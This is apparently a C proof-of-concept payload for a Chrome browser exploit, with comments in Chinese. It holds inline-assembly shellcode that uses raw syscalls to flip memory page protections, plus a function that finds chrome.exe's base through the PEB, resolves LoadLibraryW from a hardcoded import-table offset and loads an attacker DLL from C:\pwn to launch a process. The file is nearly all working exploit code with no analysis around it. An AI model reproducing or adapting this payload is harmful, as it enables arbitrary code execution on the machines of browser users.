/* calcpoc_llw.c — 自获取版：IAT 里的 LoadLibraryW → launch64.dll → poc（无硬编码、无遍历） */
typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned short wchar_t;

__attribute__((naked, used)) static void flip_thread(void) {
  __asm__ volatile(
      "movabsq $0x10201000, %r10\n\t"
      "1:\n\t"
      "movq %r10, %r11\n\t"
      "2:\n\t"
      "movq (%r11), %rax\n\t"
      "testq %rax, %rax\n\t"
      "jz 1b\n\t"
      "subq $0x48, %rsp\n\t"
      "movq %rax, 0x30(%rsp)\n\t"
      "movq $0x1000, 0x38(%rsp)\n\t"
      "movl $0, 0x40(%rsp)\n\t"
      "movq $-1, %rcx\n\t"
      "leaq 0x30(%rsp), %rdx\n\t"
      "leaq 0x38(%rsp), %r9\n\t"
      "movl $1, %r8d\n\t"
      "leaq 0x40(%rsp), %rax\n\t"
      "movq %rax, 0x28(%rsp)\n\t"
      "movl $80, %eax\n\t"
      "movq %rcx, %r10\n\t"
      "syscall\n\t"
      "movq $0x1000, 0x38(%rsp)\n\t"
      "movq $-1, %rcx\n\t"
      "leaq 0x30(%rsp), %rdx\n\t"
      "leaq 0x38(%rsp), %r9\n\t"
      "movl $4, %r8d\n\t"
      "leaq 0x40(%rsp), %rax\n\t"
      "movq %rax, 0x28(%rsp)\n\t"
      "movl $80, %eax\n\t"
      "movq %rcx, %r10\n\t"
      "syscall\n\t"
      "addq $0x48, %rsp\n\t"
      "addq $8, %r11\n\t"
      "pause\n\t"
      "jmp 2b\n\t"
      );
}
__attribute__((naked, used)) static void flip_end_marker(void) {}
__attribute__((used, section(".text"))) static const unsigned char g_pad[0x98] = {0x90};

__attribute__((used, section(".text"))) static const wchar_t g_dllpath[] = L"C:\\pwn\\launch64.dll";
__attribute__((used, section(".text"))) static const char g_mark[] = "cmd /c echo llw-marker > C:\pwn\LLW_FIRED.txt";

__attribute__((noinline, used)) void payload_main(void) {
  u64 peb;
  __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
  u64 base = *(volatile u64*)(peb + 0x10);            /* chrome.exe 基址（实测稳） */
  u64 llw  = *(volatile u64*)(base + 0x3BE4B8);       /* IAT: kernel32!LoadLibraryW（每 boot 自动对） */
  if (llw < 0x10000 || llw > 0x7ffe00000000ull) return;
  u64 (*ll)(const wchar_t*) = (u64 (*)(const wchar_t*))llw;
  ll(g_dllpath);                                       /* → launch64.dll DllMain → CreateProcessW(poc) */
  ll(L"C:\pwn\launch64.dll");
}
